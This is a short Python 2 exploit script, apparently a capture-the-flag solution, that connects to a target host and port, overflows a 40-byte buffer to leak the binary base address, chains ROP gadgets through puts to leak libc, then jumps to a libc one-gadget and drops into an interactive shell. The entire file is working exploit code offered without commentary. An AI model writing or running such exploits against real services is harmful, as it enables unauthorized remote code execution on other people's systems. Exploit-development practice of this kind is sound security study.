#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *
import random
import time
import binascii
import time

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))

s.send("A"*40) # Garbage
s.recv(40)
leak = s.recv(8)
binary_start = u64(leak + "\x00\x00") - 0x1295

print("Leaked start of the binary " + hex(binary_start))

pop_rdi = binary_start + 0x00000000000012fb
rdi_value = binary_start + 0x4000
puts = binary_start + 0x123a
leak_ropchain = "exit\x00" + "A" * 35 + p64(pop_rdi) + p64(rdi_value) + p64(puts)

s.send(leak_ropchain)
s.recv(40)
leak = s.recv(8)
leak = s.recv(8)

puts_libc = u64(leak[1:-1] + "\x00\x00")
print("Start libc " + hex(puts_libc - 0x80970))
start_libc = puts_libc - 0x80970

# set RCX=0 and jump to magic gadget in LIBC
s.send("exit\x00" + "A" * 35 + p64(0x00000000000e433e + start_libc) + p64(0x0) + p64(start_libc + 0x4f2a5))
s.recv(100)
print("Interactive..")
interactive()

